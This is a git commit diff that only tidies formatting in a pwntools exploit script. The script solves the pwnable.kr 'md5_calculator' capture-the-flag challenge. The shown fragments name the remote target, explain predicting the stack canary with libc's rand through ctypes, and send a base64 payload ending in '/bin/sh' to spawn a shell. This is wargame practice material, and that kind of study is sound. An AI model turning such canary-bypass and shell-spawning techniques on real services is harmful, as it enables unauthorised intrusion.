935a86d22a9fe2926df774d24675a76daa911a9a
saardr <saar.drori@gmail.com>
2022-04-14 18:46:08 +0300

    fix a bit of formatting in md5_calculator solution

--- Rookiss/md5_calculator/sol.py
+++ Rookiss/md5_calculator/sol.py
@@ -1,4 +1,5 @@
 #!/usr/bin/python3
+
 from pwn import *
 from ctypes import CDLL
 from base64 import b64encode
@@ -11,9 +12,6 @@ slp = 1
 host = "pwnable.kr"
 port = 9002
 
-gs = '''
-continue
-'''
 def start():
     if args.REMOTE:
         io = remote(host, port)
@@ -63,7 +61,6 @@ ps: python implements random differently then libc does which results in a diffe
 when trying to figure out the canary, so in order to use the exact same random,
 we can load the libc random with CDLL from ctypes.
 '''
-
 
 
 # EXPLOIT CODE HERE:
@@ -142,7 +139,6 @@ b64_exp += b"==/bin/sh\0"
 
 io.sendline(b64_exp)
 print(io.recv())
-
 
 
 
